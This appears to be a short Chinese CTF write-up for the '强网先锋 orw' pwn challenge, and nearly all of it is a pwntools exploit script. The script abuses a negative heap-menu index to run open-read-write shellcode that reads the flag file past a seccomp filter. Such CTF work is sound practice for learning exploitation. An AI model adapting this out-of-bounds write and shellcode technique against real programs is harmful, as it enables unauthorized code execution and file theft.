---
title: 强网先锋 orw
date: 2021-07-7 23:50:06
tags:
  - pwn
  - seccomp
  - shellcode
categories:
  - pwn
---

## exp
附件放下边了
```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
p = process("./pwn")

def add(index,size,content):
	p.recvuntil("choice >>\n")
	p.sendline("1")
	p.recvuntil("index:\n")
	p.sendline(str(index))
	p.recvuntil("size:\n")
	p.sendline(str(size))
	p.recvuntil("content:\n")
	p.sendline(str(content))
def delete(index):
	p.recvuntil("choice >>\n")
	p.sendline("4")
	p.recvuntil("index:\n")
	p.sendline(str(index))


shell = '''
/* open */
mov rdi,0x67616c662f2e
push rdi
mov r10,rsp
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
mov rax,2
syscall
/* read */
mov rdi,rax
mov rsi,r10
mov rdx,0x80
mov rax,0
syscall
/* write */
mov rdi,1
mov rsi,r10
mov rdx,rax
mov rax,1
syscall
'''

shell = asm(shell)
add(-14,0,shell)
p.recvuntil("choice >>\n")
p.sendline("1")
p.interactive()
```
[Attachment](/attachment/orw.zip)